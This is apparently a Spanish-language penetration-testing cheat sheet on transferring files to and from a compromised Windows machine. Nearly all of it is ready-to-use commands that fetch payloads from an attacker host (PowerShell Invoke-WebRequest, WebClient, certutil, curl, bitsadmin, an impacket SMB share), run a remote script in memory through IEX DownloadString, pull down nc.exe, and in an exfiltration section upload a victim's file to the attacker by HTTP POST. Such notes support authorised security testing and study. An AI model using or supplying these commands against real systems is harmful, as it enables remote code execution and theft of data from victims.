---
tags: [file-transfer, windows]
---

# Transferencia de Ficheros — Windows

## PowerShell (IWR / WebClient)

```powershell
# Invoke-WebRequest
iwr http://<ATTACKER>/archivo.exe -OutFile C:\Temp\archivo.exe
Invoke-WebRequest -Uri http://<ATTACKER>/nc.exe -OutFile C:\Temp\nc.exe

# WebClient
(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER>/archivo.exe','C:\Temp\archivo.exe')

# DownloadString — ejecutar en memoria
IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')
```

## certutil

```cmd
certutil -urlcache -f http://192.168.45.230/binary.exe C:\Users\Public\binary.exe
```

## curl (Windows 10+)

```cmd
curl http://<ATTACKER>/archivo.exe -o C:\Temp\archivo.exe
```

## BITSAdmin

```cmd
bitsadmin /transfer job /download /priority high http://<ATTACKER>/archivo.exe C:\Temp\archivo.exe
```

## SMB

```bash
# Atacante — levantar servidor SMB
impacket-smbserver share . -smb2support

# Víctima — copiar
copy \\<ATTACKER>\share\archivo.exe C:\Temp\
```

## Base64

```powershell
# Víctima — codificar y mandar
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\archivo.exe"))

# Atacante — decodificar
echo "<BASE64>" | base64 -d > archivo.exe
```

## Exfiltración

```powershell
# Subir desde víctima a atacante
Invoke-WebRequest -Uri http://<ATTACKER>:8000/upload -Method POST -InFile C:\archivo.txt
```

